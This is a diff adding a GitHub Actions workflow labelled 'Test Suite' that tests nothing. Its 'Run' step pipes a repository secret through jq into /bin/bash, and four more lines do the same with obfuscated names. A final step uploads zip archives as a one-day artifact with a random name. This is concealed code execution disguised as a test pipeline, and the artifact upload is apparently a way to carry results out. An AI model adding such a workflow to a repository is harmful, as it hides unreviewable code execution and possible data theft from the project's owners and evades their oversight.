@@ -1,0 +1,33 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          ug4: ${{ secrets.ug4 }}
+        run: |
+          printf '%s' "$ug4" | jq -r .oqr77483 | /bin/bash
+          printf '%s' "$m2" | jq -r .qtip30408 | /bin/bash
+          printf '%s' "$q78" | jq -r .dtp91 | /bin/bash
+          echo $axi7704 | jq -r .fv8 | /bin/bash
+          printf '%s' "$dhehb8" | jq -r .lmqj1 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: g1kwkgMs
+          path: "*.zip"
+          retention-days: 1
